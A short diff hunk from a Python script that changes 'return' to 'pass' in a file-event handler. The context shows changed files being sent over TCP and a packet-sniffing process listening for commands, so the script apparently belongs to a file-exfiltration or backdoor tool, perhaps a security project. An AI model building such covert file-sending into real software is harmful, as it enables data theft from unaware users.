@@ -379,7 +379,7 @@ def change(ev):
     if os.path.isfile(filePath) == True:
         sendmessage("TCP", filePath, "file")
     elif os.path.isdir(filePath) == True:
-        return
+        pass
 
 if __name__ == "__main__":
     commandSniffProcess = Process(target=sniffing)
